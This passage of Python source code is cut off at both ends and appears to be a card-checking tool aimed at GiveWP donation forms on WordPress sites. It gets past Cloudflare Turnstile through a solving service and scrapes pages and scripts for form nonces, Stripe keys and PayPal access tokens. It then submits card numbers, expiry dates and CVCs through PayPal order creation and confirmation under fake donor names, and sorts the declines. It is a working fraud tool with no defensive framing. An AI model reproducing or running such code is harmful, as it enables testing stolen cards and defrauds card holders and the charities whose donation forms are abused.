            'Origin': f'https://{self.url}',
            'Referer': self.page_url,
            'Sec-Ch-Ua': '"Chromium";v="120", "Google Chrome";v="120", "Not:A-Brand";v="99"',
            'Sec-Ch-Ua-Mobile': '?0',
            'Sec-Ch-Ua-Platform': '"Windows"',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors' if ajax else 'navigate',
            'Sec-Fetch-Site': 'same-origin' if ajax else 'none',
            'Cache-Control': 'no-cache', 'DNT': '1',
        }
        if ajax: headers['X-Requested-With'] = 'XMLHttpRequest'
        if extra: headers.update(extra)
        return headers

    def _detect_cloudflare(self):
        try:
            c = (self.all_content or '') + '\n' + (self.page_html or '')
            markers = ['challenges.cloudflare.com', 'cf-turnstile', 'turnstile.render',
                       'cf-chl-widget', '_cf_chl_opt', 'cf-challenge', 'data-sitekey']
            if not any(m in c for m in markers): return False
            for pat in [r'data-sitekey=["\'](0x[A-Za-z0-9_-]{10,})["\']',
                        r'sitekey["\']?\s*[:=]\s*["\'](0x[A-Za-z0-9_-]{10,})["\']',
                        r'["\'](0x4AAAAAA[A-Za-z0-9_-]{10,})["\']']:
                m = re.search(pat, c)
                if m: self.cf_sitekey = m.group(1); break
            return True
        except: return False

    def _solve_cloudflare(self):
        if not self.cf_detected or not TS_API_URL or not TS_API_KEY or not self.cf_sitekey: return False
        try:
            r = requests.post(f'{TS_API_URL}/turnstile',
                headers={'x-api-key': TS_API_KEY, 'Content-Type': 'application/json'},
                json={'url': self.page_url, 'sitekey': self.cf_sitekey}, timeout=20)
            if r.status_code != 200: return False
            tid = r.json().get('task_id')
            if not tid: return False
            end = time.time() + 90
            while time.time() < end:
                r = requests.get(f'{TS_API_URL}/result/{tid}',
                    headers={'x-api-key': TS_API_KEY}, timeout=20)
                if r.status_code == 202: time.sleep(2); continue
                if r.status_code == 200:
                    token = r.json().get('token')
                    if token:
                        self.r.cookies.set('cf_clearance', token, domain=self.url)
                        self.cf_solved = True
                        return True
                return False
        except: return False

    def _warmup_session(self):
        try:
            if self._warmed: return True
            try: self.r.get(self.page_url, timeout=10, headers={'referer': f'https://{self.url}/'})
            except: pass
            self._warmed = True
            return True
        except: return False

    def _deep_session_bake(self):
        try:
            if self._baked: return True
            if self.id_form2 and self.nonce and self.au:
                self._baked = True; return True
            try: self.r.get(self.page_url, timeout=8, headers=self._get_browser_headers(ajax=False))
            except: pass
            if self.ajax_url and self.id_form2 and not self.nonce:
                try:
                    self._safe_post(self.ajax_url,
                        data={'action': 'give_donation_form_nonce', 'form_id': self.id_form2},
                        headers=self._get_browser_headers(), timeout=4)
                except: pass
            self._baked = True
            return True
        except: return True

    def _fetch_page(self):
        for _ in range(2):
            try:
                r = self._safe_get(self.page_url, timeout=15, headers={'referer': f'https://{self.url}/'})
                if r and r.status_code == 200 and r.text:
                    self.page_html = r.text; self.all_content = r.text
                    return True
            except: pass
            time.sleep(0.2)
        return False

    def _load_iframes(self):
        try:
            if not self.page_html or self.id_form2: return
            pat = r'<iframe[^>]*src=["\']([^"\']*(?:give|donation|form|checkout|pay|stripe)[^"\']*)["\']'
            for m in re.finditer(pat, self.page_html, re.I):
                try:
                    full = self._build_url(self.url, m.group(1))
                    if not full: continue
                    r = self._safe_get(full, timeout=6)
                    if r and r.status_code == 200 and r.text: self.all_content += '\n' + r.text
                except: continue
        except: pass

    def _load_all_js(self):
        try:
            if not self.page_html or (self.id_form2 and self.au): return
            js_urls = re.findall(r'<script[^>]+src=["\']([^"\']+\.js[^"\']*)["\']', self.page_html)
            prio = [u for u in js_urls if any(k in u.lower() for k in
                    ('give','donation','paypal','commerce','token','client','stripe','payment','checkout'))]
            ordered = (prio + [u for u in js_urls if u not in prio])[:10]
            for js_url in ordered:
                try:
                    full = self._build_url(self.url, js_url)
                    if not full: continue
                    r = self._safe_get(full, timeout=4)
                    if r and r.status_code == 200 and r.text: self.all_content += '\n' + r.text
                except: continue
        except: pass

    def _find_form_id_comprehensive(self):
        try:
            c = self.all_content or ''
            patterns = [
                r'name=["\']give-form-id["\'][^>]*value=["\'](\d+)["\']',
                r'"give-form-id"\s*:\s*"?(\d+)"?',
                r'data-form-id=["\'](\d+)["\']',
                r'give-form-(\d+)', r'give_form_(\d+)',
                r'give-form-id["\']?\s*[:=]\s*["\']?(\d+)',
                r'data-give-form-id=["\'](\d+)["\']',
                r'id=["\']give-form-(\d+)["\']',
                r'class=["\'][^"\']*give-form[^"\']*["\'][^>]*data-form-id=["\'](\d+)["\']',
                r'data-form-id-prefix=["\'](\d+)-',
                r'give-form-id-prefix["\']?\s*[:=]\s*["\']?(\d+)',
                r'<form[^>]*id=["\']give-form-(\d+)',
                r'<form[^>]*data-id=["\'](\d+)["\']',
                r'var\s+form_id\s*=\s*["\']?(\d+)',
                r'form_id["\']?\s*[:=]\s*["\']?(\d+)',
                r'formId["\']?\s*[:=]\s*["\']?(\d+)',
                r'giveForms?\s*=\s*\{[^}]*["\']?id["\']?\s*:\s*["\']?(\d+)',
                r'data-form=["\'](\d+)["\']',
                r'give-form-edit-(\d+)',
                r'renewal[_-]form[_-]id["\']?\s*[:=]\s*["\']?(\d+)',
                r'subscription[_-]form[_-]id["\']?\s*[:=]\s*["\']?(\d+)',
                r'"formid"\s*:\s*(\d+)',
            ]
            for pattern in patterns:
                m = re.search(pattern, c, re.I)
                if m:
                    fid = m.group(1)
                    try:
                        if 100 <= int(fid) <= 9999999: return fid
                    except: pass
            if self.ajax_url:
                for action in ('give_get_forms', 'give_get_form_by_id', 'get_give_form'):
                    try:
                        r = self.r.post(self.ajax_url, data={'action': action},
                                        headers=self._get_browser_headers(), timeout=4)
                        if r and r.status_code == 200:
                            for p in patterns[:10]:
                                m = re.search(p, r.text, re.I)
                                if m:
                                    try:
                                        if 100 <= int(m.group(1)) <= 9999999: return m.group(1)
                                    except: pass
                    except: continue
            for ep in ('/wp-json/give-api/v1/forms', '/wp-json/give/v1/forms'):
                try:
                    r = self._safe_get(f'https://{self.url}{ep}', timeout=4)
                    if r and r.status_code == 200:
                        matches = re.findall(r'"id"\s*:\s*(\d+)', r.text)
                        for fid in matches:
                            try:
                                if 100 <= int(fid) <= 9999999: return fid
                            except: pass
                except: continue
            return None
        except: return None

    def _find_stripe_pk_deep(self):
        if self.stripe_pk: return
        c = self.all_content
        for m in re.finditer(r'(pk_live_[A-Za-z0-9]{20,}|pk_test_[A-Za-z0-9]{20,})', c):
            self.stripe_pk = m.group(1); return
        for pat in [r'"stripe"[^}]*"publishable_key"\s*:\s*"(pk_[^"]+)"',
                    r'stripe_pk["\']?\s*[:=]\s*["\']([^"\']+pk_[^"\']+)["\']',
                    r'"publishableKey"\s*:\s*"(pk_[^"]+)"',
                    r'"publicKey"\s*:\s*"(pk_[^"]+)"']:
            m = re.search(pat, c, re.I)
            if m: self.stripe_pk = m.group(1); return

    def _extract_basic(self):
        try:
            c = self.all_content
            if not c: return
            for p in [r'name="give-form-id-prefix"\s+value="([^"]+)"', r'"give-form-id-prefix"\s*:\s*"([^"]+)"', r'data-form-id-prefix=["\']([^"\']+)["\']']:
                m = re.search(p, c)
                if m: self.id_form1 = m.group(1); break
            for p in [r'name="give-form-id"\s+value="(\d+)"', r'"give-form-id"\s*:\s*"?(\d+)"?', r'data-form-id=["\'](\d+)["\']', r'give-form-(\d+)-']:
                m = re.search(p, c)
                if m: self.id_form2 = m.group(1); break
            if not self.nonce:
                for p in [r'name="give-form-hash"\s+value="([^"]+)"', r'"give-form-hash"\s*:\s*"([^"]+)"', r'"nonce"\s*:\s*"([a-f0-9]{8,32})"', r'name="_wpnonce"\s+value="([^"]+)"']:
                    m = re.search(p, c)
                    if m: self.nonce = m.group(1); break
            for p in [r'name="give-form-minimum"\s+value="([^"]*)"', r'"give-form-minimum"\s*:\s*"([^"]*)"', r'"minimum_price"\s*:\s*"?([\d.]+)"?']:
                m = re.search(p, c)
                if m and m.group(1).strip(): self.minimum = m.group(1).strip(); break
            for p in [r'name="give-currency"\s+value="([A-Za-z]{3})"', r'"give-currency"\s*:\s*"([A-Za-z]{3})"', r'"currency"\s*:\s*"([A-Za-z]{3})"', r'data-currency=["\']([A-Za-z]{3})["\']']:
                m = re.search(p, c, re.I)
                if m: self.currency = m.group(1).upper(); break
            self.price_levels = []; seen = set()
            def _add(pid, amt):
                try:
                    amt_f = float(str(amt).replace(',', ''))
                    pid_s = str(pid).strip()
                    if pid_s and amt_f > 0 and (pid_s, amt_f) not in seen:
                        seen.add((pid_s, amt_f)); self.price_levels.append((pid_s, amt_f))
                except: pass
            for m in re.finditer(r'data-price-id=["\']([^"\']+)["\'][^>]*?data-price=["\']([\d.]+)["\']', c, re.I): _add(m.group(1), m.group(2))
            for m in re.finditer(r'data-price=["\']([\d.]+)["\'][^>]*?data-price-id=["\']([^"\']+)["\']', c, re.I): _add(m.group(2), m.group(1))
            for m in re.finditer(r'<input[^>]*name=["\']give-price-id["\'][^>]*value=["\']([^"\']+)["\'][^>]*data-price=["\']([\d.]+)["\']', c, re.I): _add(m.group(1), m.group(2))
            self.price_levels = sorted(self.price_levels, key=lambda x: x[1])
            if 'admin-ajax.php' in c and not self.ajax_url:
                self.ajax_url = f'https://{self.url}/wp-admin/admin-ajax.php'
        except: pass

    def _extract_all_form_fields(self):
        try:
            c = self.all_content
            if not c: return
            self.form_fields = {}
            for m in re.finditer(r'<select[^>]*name=["\']([^"\']+)["\'][^>]*>(.*?)</select>', c, re.DOTALL | re.I):
                try:
                    name = m.group(1); inner = m.group(2); tag = m.group(0)
                    required = 'required' in tag.lower()
                    opts = [om.group(1).strip() for om in re.finditer(r'<option[^>]*value=["\']([^"\']*)["\'][^>]*>', inner) if om.group(1).strip()]
                    self.form_fields[name] = {'type': 'select', 'required': required, 'options': opts}
                except: continue
            radio = {}
            for m in re.finditer(r'<input[^>]*type=["\']radio["\'][^>]*>', c, re.I):
                try:
                    tag = m.group(0)
                    nm = re.search(r'name=["\']([^"\']+)["\']', tag)
                    vm = re.search(r'value=["\']([^"\']*)["\']', tag)
                    if nm and vm:
                        name = nm.group(1); val = vm.group(1)
                        if name not in radio: radio[name] = {'required': 'required' in tag.lower(), 'options': []}
                        if val and val not in radio[name]['options']: radio[name]['options'].append(val)
                except: continue
            for name, info in radio.items():
                self.form_fields[name] = {'type': 'radio', 'required': info['required'], 'options': info['options']}
            for m in re.finditer(r'<input[^>]*type=["\'](text|email|tel|number|date)["\'][^>]*>', c, re.I):
                try:
                    tag = m.group(0)
                    nm = re.search(r'name=["\']([^"\']+)["\']', tag)
                    if nm and nm.group(1) not in self.form_fields:
                        self.form_fields[nm.group(1)] = {'type': m.group(1).lower(), 'required': 'required' in tag.lower(), 'options': []}
                except: continue
            all_names = []
            for m in re.finditer(r'<input[^>]*name=["\']([^"\']+)["\']', c, re.I): all_names.append(m.group(1))
            NUM_KW = ['number','num','pan','cc','card']
            CVC_KW = ['cvc','cvv','csc','cvv2','cvc2','csc2','security','verification','cvn','card_verification','card_security','cvv_code','security_code','cvc_code']
            EXP_KW = ['exp','expiry','expiration','expire','valid_thru','valid_until','validity','expire_date','exp_date','expiry_date','expiration_date']
            EXP_MO_KW = ['exp_month','expmonth','exp_mo','exp_m','card_exp_month','expire_month','expiration_month']
            EXP_YR_KW = ['exp_year','expyear','exp_yr','exp_y','card_exp_year','expire_year','expiration_year']
            NAME_KW = ['cardholder','card_holder','card_name','cardname','ccname','cc_name','cc-name','name_on_card','account_name','holder_name','billing_name']
            def _classify(fl):
                fl2 = fl.lower().replace('[','_').replace(']','_').replace('-','_')
                if any(k in fl2 for k in ('give_','payment_mode','give_gateway','give_first','give_last','give_email','give_amount','billing_country','billing_state','billing_city','first_name','last_name','email','phone','company','comment')): return None
                if any(k in fl2 for k in EXP_MO_KW): return 'exp_month'
                if any(k in fl2 for k in EXP_YR_KW): return 'exp_year'
                if any(k in fl2 for k in EXP_KW): return 'exp'
                if any(k in fl2 for k in CVC_KW): return 'cvc'
                if any(k in fl2 for k in NAME_KW): return 'name'
                if any(k in fl2 for k in ('zip','postal','postcode','zipcode')): return 'zip'
                if any(k in fl2 for k in ('card','cc','pan')):
                    if any(k in fl2 for k in ('number','num','pan')): return 'num'
                return None
            self.card_field_names = {}
            for fname in all_names:
                cat = _classify(fname)
                if cat: self.card_field_names[fname] = {'category': cat, 'original': fname.lower()}
            self.has_card_fields = len(self.card_field_names) > 0
        except: pass

    def _resolve_dropdown_options(self):
        try:
            for name, info in list(self.form_fields.items()):
                if info.get('options'): info['options'] = [o for o in info['options'] if is_valid_option(o)]
                if info.get('type') != 'select' or info.get('options') or not info.get('required'): continue
                if self.ajax_url and self.id_form2:
                    try:
                        r = self._safe_post(self.ajax_url, data={'action': 'give_get_form_field_options', 'field_name': name, 'form_id': self.id_form2}, timeout=5)
                        if r and r.status_code == 200:
                            j = r.json()
                            if isinstance(j.get('data'), list) and j['data']:
                                valid = [o for o in j['data'] if is_valid_option(o)]
                                if valid: info['options'] = valid; continue
                    except: pass
                info['required'] = False
        except: pass

    def _resolve_special_fields(self):
        try:
            country = 'US'
            for f in ('billing_country', 'give_country', 'country'):
                if f in self.form_fields:
                    opts = [o for o in self.form_fields[f].get('options', []) if is_valid_option(o)]
                    if opts: country = opts[0]; break
            special = {'last_4_digits_nricfin': str(random.randint(1000, 9999)),
                       'contact_number_to_collect': ('+6581234567' if country == 'SG' else '+1234567890')}
            for name, val in special.items():
                if name in self.form_fields: self.form_fields[name]['prefill'] = val
        except: pass

    def _add_candidate(self, token, source):
        if not token or len(token) < 20: return
        for c in self.token_candidates:
            if c['token'] == token: return
        self.token_candidates.append({'token': token, 'source': source})

    def _extract_tokens_from_text(self, text, source):
        for m in re.finditer(r'"accessToken"\s*:\s*"([^"]+)"', text, re.I):
            self._add_candidate(m.group(1), source)
        mm = re.search(r'merchant_id=([\w]+)', text)
        if mm and not self.paypal: self.paypal = mm.group(1)
        cm = re.search(r'"clientId"\s*:\s*"([^"]+)"', text)
        if cm and not self.client_id: self.client_id = cm.group(1)
        for m in re.finditer(r'\b(A21[A-Za-z0-9+/=_-]{40,})\b', text):
            self._add_candidate(m.group(1), f'{source}-A21')
        if 50 < len(text) < 400 and ' ' not in text and any(text.startswith(p) for p in ('A21', 'eyJ')):
            self._add_candidate(text, f'{source}-long')

    def _extract_tokens_ultimate(self):
        try:
            c = self.all_content
            if not c: return False
            chunks = ExtractorEngine.extract_all(c)
            for chunk in chunks:
                try:
                    t = chunk['content']
                    self._extract_tokens_from_text(t, chunk['source'])
                    if any(x in t for x in '=+/_') and len(t) < 2000:
                        for d in DecoderEngine.decode_chain(t, max_depth=2)[:3]:
                            self._extract_tokens_from_text(d, f"{chunk['source']}+dec")
                except: continue
            for m in re.finditer(r'\b(A21[A-Za-z0-9+/=_-]{40,})\b', c): self._add_candidate(m.group(1), 'A21')
            for m in re.finditer(r'\b(eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+)\b', c):
                raw = m.group(1); self._add_candidate(raw, 'jwt')
                pj = DecoderEngine.jwt_payload(raw)
                if pj:
                    try:
                        j = json.loads(pj)
                        if 'accessToken' in j: self._add_candidate(j['accessToken'], 'jwt-AT')
                        if 'clientId' in j and not self.client_id: self.client_id = j['clientId']
                        if 'merchant_id' in j and not self.paypal: self.paypal = j['merchant_id']
                    except: pass
            for pat in [r'"data-client-token"\s*:\s*"([^"]+)"', r'data-client-token=["\']([^"\']+)["\']', r'"clientToken"\s*:\s*"([^"]+)"']:
                for m in re.finditer(pat, c, re.I):
                    raw = m.group(1)
                    if len(raw) > 20: self._add_candidate(raw, 'direct')
                    for d in DecoderEngine.decode_chain(raw, max_depth=3):
                        self._extract_tokens_from_text(d, 'b64-dec')
            for m in re.finditer(r'"accessToken"\s*:\s*"([^"]+)"', c, re.I):
                if len(m.group(1)) > 20: self._add_candidate(m.group(1), 'direct-AT')
            return len(self.token_candidates) > 0
        except: return False

    def _validate_token(self, token, timeout=5):
        if not token or len(token) < 20: return False
        valid_p = ('A21', 'eyJ', 'Q2l0', 'RW', 'V1')
        if not any(token.startswith(p) for p in valid_p) and len(token) < 100: return False
        try:
            r = self.r.head('https://api-m.paypal.com/v2/checkout/orders', headers={'Authorization': f'Bearer {token}'}, timeout=timeout)
            if r.status_code in (200, 201, 400, 405, 422): return True
            if r.status_code == 401: return False
        except: return len(token) > 50
        return False

    def _pick_valid_token(self):
        if not self.token_candidates: return False
        def prio(c):
            s = c['source'].lower()
            if 'a21' in s: return 0
            if 'direct' in s: return 1
            if 'jwt' in s: return 2
            if 'b64' in s: return 3
            return 4
        for c in sorted(self.token_candidates, key=prio):
            if self._validate_token(c['token']):
                self.au = c['token']; self.token_verified = True; return True
        return False

    def _try_ajax_client_token(self):
        if not self.ajax_url or not self.id_form2: return False
        for action in ['give_paypal_commerce_get_client_token', 'get_client_token', 'give_get_client_token']:
            try:
                r = self._safe_post(self.ajax_url,
                    data={'action': action, 'form-id': self.id_form2, 'give-form-hash': self.nonce or '', 'give-form-id-prefix': self.id_form1 or f'{self.id_form2}-1'},
                    headers={'user-agent': self.uu.random, 'x-requested-with': 'XMLHttpRequest', 'referer': self.page_url}, timeout=6)
                if r and r.status_code == 200 and r.text:
                    try:
                        j = r.json(); token = None
                        if isinstance(j.get('data'), str): token = j['data']
                        elif isinstance(j.get('data'), dict):
                            d = j['data']; token = d.get('client_token') or d.get('token') or d.get('access_token')
                        if not token: token = j.get('client_token') or j.get('token') or j.get('access_token')
                        if token and len(token) > 20:
                            try:
                                dec = base64.b64decode(token + '=' * (-len(token) % 4)).decode('utf-8', errors='ignore')
                                tm = re.search(r'"accessToken"\s*:\s*"([^"]+)"', dec)
                                if tm: self._add_candidate(tm.group(1), f'ajax-b64:{action}'); continue
                            except: pass
                            self._add_candidate(token, f'ajax:{action}')
                    except: pass
            except: continue
        return len(self.token_candidates) > 0

    def _try_ajax_nonce(self):
        try:
            if not self.ajax_url: self.ajax_url = f'https://{self.url}/wp-admin/admin-ajax.php'
            if not self.id_form2: return False
            for action in ['give_get_form_nonce', 'give_donation_form_nonce']:
                r = self._safe_post(self.ajax_url, data={'action': action, 'form_id': self.id_form2},
                    headers={'user-agent': self.uu.random, 'x-requested-with': 'XMLHttpRequest'}, timeout=5)
                if r and r.status_code == 200 and r.text:
                    try:
                        j = r.json()
                        if 'data' in j and isinstance(j['data'], str) and len(j['data']) >= 6:
                            self.nonce = j['data']; return True
                        if 'nonce' in j: self.nonce = j['nonce']; return True
                    except: pass
        except: pass
        return False

    def _detect_all_payment_modes(self):
        try:
            c = self.all_content
            self.enabled_modes = []
            for m in re.finditer(r'<input[^>]*name=["\']payment-mode["\'][^>]*value=["\']([^"\']+)["\']', c, re.I):
                mode = m.group(1)
                if mode and mode not in self.enabled_modes: self.enabled_modes.append(mode)
            for fname in ('payment_mode', 'give-gateway', 'gateway', 'gateway_id'):
                for m in re.finditer(rf'<input[^>]*name=["\']{re.escape(fname)}["\'][^>]*value=["\']([^"\']+)["\']', c, re.I):
                    mode = m.group(1)
                    if mode and mode not in self.enabled_modes: self.enabled_modes.append(mode)
            self.actual_payment_mode = None
            for pat in [r'<input[^>]*name=["\']payment-mode["\'][^>]*checked[^>]*value=["\']([^"\']+)["\']',
                        r'<input[^>]*value=["\']([^"\']+)["\'][^>]*checked[^>]*name=["\']payment-mode["\']']:
                m = re.search(pat, c, re.I)
                if m: self.actual_payment_mode = m.group(1); break
            if not self.actual_payment_mode and self.enabled_modes: self.actual_payment_mode = self.enabled_modes[0]
            self.all_card_modes = []
            for mode in self.enabled_modes:
                ml = mode.lower()
                if any(k in ml for k in ('card', 'credit', 'stripe', 'cc', 'braintree',
                                          'authorize', 'square', 'mollie', 'razorpay',
                                          'paystack', 'flutterwave', 'adyen')):
                    self.all_card_modes.append(mode)
            self.paypal_modes = []
            for mode in self.enabled_modes:
                ml = mode.lower()
                if 'paypal' in ml or 'payflow' in ml or 'braintree' in ml:
                    if mode not in self.paypal_modes: self.paypal_modes.append(mode)
        except: pass

    def _detect_gateway_type(self):
        try:
            c = self.all_content
            if not c: self.gateway_type = 'unknown'; return
            self._detect_all_payment_modes()
            self.has_stripe = False; self.has_paypal_commerce = False
            self.has_braintree = False; self.has_paypal_sdk = False
            for m in re.finditer(r'(pk_live_[A-Za-z0-9]{20,}|pk_test_[A-Za-z0-9]{20,})', c):
                self.stripe_pk = m.group(1); self.has_stripe = True; break
            if not self.has_stripe:
                for mk in ('js.stripe.com', 'give-stripe', 'give_stripe', 'stripe.elements', 'stripe.createToken'):
                    if mk in c: self.has_stripe = True; break
            if 'give_paypal_commerce' in c: self.has_paypal_commerce = True
            if 'paypal-commerce' in self.enabled_modes: self.has_paypal_commerce = True
            if 'paypal.com/sdk/js' in c and 'client-id=' in c: self.has_paypal_sdk = True; self.has_paypal_commerce = True
            if 'braintreegateway.com' in c or 'braintree' in self.enabled_modes: self.has_braintree = True; self.has_paypal_commerce = True
            if self.has_stripe and self.has_paypal_commerce: self.gateway_type = 'hybrid_stripe_paypal'
            elif self.has_stripe: self.gateway_type = 'stripe'
            elif self.has_braintree: self.gateway_type = 'braintree'
            elif self.has_paypal_sdk: self.gateway_type = 'paypal_sdk'
            elif self.has_paypal_commerce: self.gateway_type = 'givewp_paypal'
            elif self.all_card_modes: self.gateway_type = 'card_gateway'
            elif self.has_card_fields: self.gateway_type = 'raw_card'
            elif 'paypal' in c.lower(): self.gateway_type = 'paypal_unknown'
            else: self.gateway_type = 'unknown'
        except: self.gateway_type = 'unknown'

    def _refresh_nonce(self):
        try:
            r = self._safe_get(self.page_url, timeout=10)
            if not r or r.status_code != 200: return False
            h = r.text; self.page_html = h; self.all_content = h
            m = re.search(r'name="give-form-hash"\s+value="([^"]+)"', h)
            if m: self.nonce = m.group(1)
            m = re.search(r'name="give-form-id"\s+value="(\d+)"', h)
            if m: self.id_form2 = m.group(1)
            m = re.search(r'name="give-form-id-prefix"\s+value="([^"]+)"', h)
            if m: self.id_form1 = m.group(1)
            return bool(self.nonce)
        except: return False

    def _autofill_required_fields(self, form_data):
        try:
            for name, info in self.form_fields.items():
                if name in form_data or not info.get('required'): continue
                if name.startswith(('give-form-', 'give_')): continue
                if name in ('give-amount', 'give_first', 'give_last', 'give_email', 'give-gateway', 'payment-mode', 'give-price-id', 'give_agree_to_terms', 'give_terms_agreement'): continue
                if 'prefill' in info: form_data[name] = info['prefill']; continue
                ft = info.get('type', ''); opts = [o for o in info.get('options', []) if is_valid_option(o)]
                nl = name.lower()
                if ft in ('select', 'radio'):
                    if not opts: continue
                    form_data[name] = opts[0]
                elif ft == 'checkbox': form_data[name] = opts[0] if opts else 'on'
                elif ft == 'email': form_data[name] = self.email
                elif ft == 'number': form_data[name] = '1'
                elif ft == 'tel': form_data[name] = '1234567890'
                elif ft == 'date': form_data[name] = '1990-01-01'
                else:
                    if 'first' in nl: form_data[name] = random.choice(FIRST_NAMES)
                    elif 'last' in nl: form_data[name] = random.choice(LAST_NAMES)
                    elif 'name' in nl: form_data[name] = f'{random.choice(FIRST_NAMES)} {random.choice(LAST_NAMES)}'
                    elif 'email' in nl: form_data[name] = self.email
                    elif any(k in nl for k in ('phone', 'mobile', 'tel')): form_data[name] = '1234567890'
                    elif any(k in nl for k in ('address', 'street')): form_data[name] = '123 Main St'
                    elif 'city' in nl: form_data[name] = 'New York'
                    elif any(k in nl for k in ('zip', 'postal')): form_data[name] = '10001'
                    elif 'state' in nl: form_data[name] = 'NY'
                    elif 'country' in nl: form_data[name] = 'US'
                    elif 'nric' in nl or 'fin' in nl: form_data[name] = 'S1234567A'
                    elif 'amount' in nl: form_data[name] = self.donation
                    else: form_data[name] = 'Test'
        except: pass
        return form_data

    def _autofill_card_fields(self, form_data, n, mm, yy, cvc):
        try:
            expiry_slash = f'{mm}/{yy}'
            expiry_slash_full = f'{mm}/20{yy}'
            full_name = f'{random.choice(FIRST_NAMES)} {random.choice(LAST_NAMES)}'
            year_full = f'20{yy}'
            for fname, info in self.card_field_names.items():
                cat = info.get('category', ''); fl = info.get('original', '')
                if cat == 'num': form_data[fname] = n
                elif cat == 'cvc': form_data[fname] = cvc
                elif cat == 'exp':
                    if 'yyyy' in fl or 'full' in fl: form_data[fname] = expiry_slash_full
                    else: form_data[fname] = expiry_slash
                elif cat == 'exp_month': form_data[fname] = mm
                elif cat == 'exp_year':
                    if 'yy' in fl and 'yyyy' not in fl and '20' not in fl: form_data[fname] = yy
                    else: form_data[fname] = year_full
                elif cat == 'name': form_data[fname] = full_name
                elif cat == 'zip': form_data[fname] = '10001'
        except: pass
        return form_data

    def Key(self):
        try:
            if not self.page_url or 'invalid.local' in self.page_url: return False
            self._warmup_session()
            self._deep_session_bake()
            if not self._fetch_page(): return False
            self.cf_detected = self._detect_cloudflare()
            if self.cf_detected and self._solve_cloudflare(): self._fetch_page()
            self._extract_basic()
            self._extract_all_form_fields()
            if not self.id_form2:
                fid = self._find_form_id_comprehensive()
                if fid:
                    self.id_form2 = fid
                    self._log(f'form_id comprehensive: {fid}')
            self._extract_tokens_ultimate()
            self._find_stripe_pk_deep()
            if self.token_candidates and self._pick_valid_token(): self.auth_method = 'token'
            if not self.au:
                self._load_iframes(); self._extract_basic(); self._extract_tokens_ultimate()
                if self.token_candidates and self._pick_valid_token(): self.auth_method = 'token'
            if not self.au:
                self._load_all_js(); self._extract_tokens_ultimate()
                if self.token_candidates and self._pick_valid_token(): self.auth_method = 'token'
            if not self.au:
                if self._try_ajax_client_token() and self._pick_valid_token(): self.auth_method = 'ajax'
            if not self.nonce and self.id_form2: self._try_ajax_nonce()
            self._resolve_dropdown_options(); self._resolve_special_fields()
            if not self.id_form1 and self.id_form2: self.id_form1 = f'{self.id_form2}-1'
            if not self.ajax_url: self.ajax_url = f'https://{self.url}/wp-admin/admin-ajax.php'
            self._detect_gateway_type()
            c_low = (self.all_content or '').lower()
            give_sigs = ['give-form', 'give_payment', 'givewp', 'give_stripe', 'give_paypal',
                         'give_donation', 'give_goal', 'give-embed-form']
            self.is_givewp = any(sig in c_low for sig in give_sigs)
            return True
        except: return False

    def _create_order(self, amt, pid, payment_mode='paypal-commerce', attempt=1, max_attempts=2):
        try:
            fd = {
                'give-form-id-prefix': self.id_form1 or '', 'give-form-id': self.id_form2 or '',
                'give-form-hash': self.nonce or '', 'give-amount': amt, 'give-currency': self.currency,
                'payment-mode': payment_mode, 'give_first': random.choice(FIRST_NAMES),
                'give_last': random.choice(LAST_NAMES), 'give_email': self.email,
                'give-gateway': payment_mode, 'give_agree_to_terms': 'on', 'give_terms_agreement': 'on',
            }
            if pid is not None: fd['give-price-id'] = pid
            fd = self._autofill_required_fields(fd)
            da = MultipartEncoder({k: (None, str(v) if v is not None else '') for k, v in fd.items()})
            he = {'content-type': da.content_type, 'user-agent': self.uu.random, 'x-requested-with': 'XMLHttpRequest',
                  'referer': self.page_url, 'origin': f'https://{self.url}'}
            r3 = None
            for retry in range(2):
                try:
                    r3 = self.r.post(self.ajax_url, params={'action': 'give_paypal_commerce_create_order'}, headers=he, data=da, timeout=20)
                    break
                except (requests.exceptions.Timeout, requests.exceptions.ConnectionError) as e:
                    time.sleep(1 + retry); continue
                except Exception as e: break
            if r3 is None: return None, 'NETWORK_FAILED'
            body = r3.text or ''
            if r3.status_code != 200:
                if r3.status_code in (401, 403):
                    if attempt < max_attempts: self._refresh_nonce(); return self._create_order(amt, pid, payment_mode, attempt+1, max_attempts)
                    return None, f'AUTH_REQUIRED: HTTP_{r3.status_code}'
                if 'not enabled' in body.lower(): return None, f'GATEWAY_NOT_ENABLED: {payment_mode}'
                return None, f'HTTP_{r3.status_code}'
            try: j = r3.json()
            except:
                if 'nonce' in body.lower() and attempt < max_attempts:
                    self._refresh_nonce(); return self._create_order(amt, pid, payment_mode, attempt+1, max_attempts)
                return None, 'JSON_ERR'
            if isinstance(j, dict) and j.get('success') and isinstance(j.get('data'), dict) and j['data'].get('id'):
                return j['data']['id'], None
            real = extract_response_text(body)
            return None, real or 'ORDER_CREATE_FAILED'
        except Exception as e:
            return None, f'EXC_{type(e).__name__}'

    def _attempt_charge(self, n, mm, yy, cvc, amt, pid="custom", payment_mode='paypal-commerce'):
        try:
            self._current_gateway_name = 'paypal_commerce'
            self.donation = amt; expiry = f'20{yy}-{mm}'
            order_id, create_err = self._create_order(amt, pid, payment_mode=payment_mode)
            if not order_id:
                if create_err and is_auth_failure(create_err): return 'AUTH_FAILURE_ON_CREATE', create_err
                return None, create_err or 'ORDER_CREATE_FAILED'
            metadata = self.paypal or self.client_id or ''
            he4 = {'authorization': f'Bearer {self.au or ""}', 'paypal-client-metadata-id': metadata,
                   'content-type': 'application/json', 'origin': f'https://{self.url}',
                   'referer': f'https://{self.url}/', 'user-agent': self.uu.random}
            da3 = {'payment_source': {'card': {'number': n, 'expiry': expiry, 'security_code': cvc,
                   'attributes': {'verification': {'method': 'SCA_WHEN_REQUIRED'}}}},
                   'application_context': {'vault': False}}
            confirm_body = ''; confirm_ok = False
            try:
                cr = self.r.post(f'https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source', headers=he4, json=da3, timeout=20)
                confirm_body = cr.text or ''; confirm_ok = cr.status_code in (200, 201, 202, 422)
            except: confirm_body = ''; confirm_ok = False
            if confirm_ok and confirm_body:
                if is_card_decline(confirm_body): return (extract_response_text(confirm_body) or confirm_body[:300]), confirm_body
                if is_auth_failure(confirm_body): return 'AUTH_FAILURE_ON_CONFIRM', confirm_body
            try:
                fd = {
                    'give-form-id-prefix': self.id_form1 or '', 'give-form-id': self.id_form2 or '',
                    'give-form-hash': self.nonce or '', 'give-amount': amt, 'give-currency': self.currency,
                    'payment-mode': payment_mode, 'give_first': random.choice(FIRST_NAMES),
